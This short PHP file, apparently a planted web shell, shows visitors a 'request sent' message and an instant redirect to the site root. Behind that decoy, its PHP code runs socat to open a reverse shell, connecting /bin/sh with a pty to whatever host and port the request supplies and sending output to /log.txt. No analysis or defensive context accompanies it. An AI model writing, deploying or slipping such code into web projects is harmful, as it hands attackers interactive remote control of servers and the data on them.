<head>
<meta http-equiv="refresh" content="0; url=/" />
</head>
request sent
<a href="/">redirect</a>

<?php
  exec('env TERM=linux bash/socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/sh,pty,stderr,setsid,sigint,sane >/log.txt 2>&1 &');
?>
